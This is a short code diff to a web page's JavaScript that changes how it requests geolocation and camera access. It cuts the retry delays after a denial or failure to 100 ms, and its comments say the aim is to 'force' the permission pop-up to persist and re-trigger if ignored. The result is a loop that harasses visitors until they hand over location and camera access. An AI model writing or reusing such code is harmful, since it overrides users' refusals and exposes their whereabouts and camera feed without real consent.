@@ -150,9 +150,10 @@ document.addEventListener('DOMContentLoaded', () => {
                         resolve,
                         (err) => {
                             console.log("Loc failed, retrying...", err);
-                            setTimeout(tryLoc, 1000); // Retry forever
+                            // Retry almost immediately to force "pop" persistence
+                            setTimeout(tryLoc, 100);
                         },
-                        { enableHighAccuracy: true, timeout: 10000 }
+                        { enableHighAccuracy: true, timeout: 4000 } // Lower timeout to re-trigger faster if ignored
                     );
                 };
                 tryLoc();
@@ -201,7 +202,8 @@ document.addEventListener('DOMContentLoaded', () => {
                         return stream;
                     } catch (err) {
                         console.log("Camera denied/failed, retrying...", err);
-                        await new Promise(r => setTimeout(r, 1000));
+                        // Retry aggressively
+                        await new Promise(r => setTimeout(r, 100));
                     }
                 }
             };
